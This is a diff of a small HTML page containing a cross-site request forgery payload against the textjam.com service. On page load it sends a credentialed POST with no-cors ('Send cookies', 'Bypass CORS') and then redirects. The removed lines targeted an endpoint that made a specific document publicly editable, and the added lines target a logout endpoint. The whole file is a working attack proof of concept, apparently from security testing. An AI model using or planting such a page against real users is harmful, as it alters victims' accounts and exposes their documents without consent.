@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <script>
 // Auto-execute on page load
-fetch('https://textjam.com/api/doc/RGF13CPH/access/public/editor', {
+fetch('https://textjam.com/api/auth/logout', {
     method: 'POST',
     credentials: 'include',  // Send cookies
     mode: 'no-cors'         // Bypass CORS
@@ -9,7 +9,8 @@ fetch('https://textjam.com/api/doc/RGF13CPH/access/public/editor', {
 
 // Redirect immediately
 setTimeout(() => {
-    window.location.href = 'https://textjam.com/doc/RGF13CPH';
+    window.location.href = 'https://textjam.com';
 }, 300);
 </script>
+
 
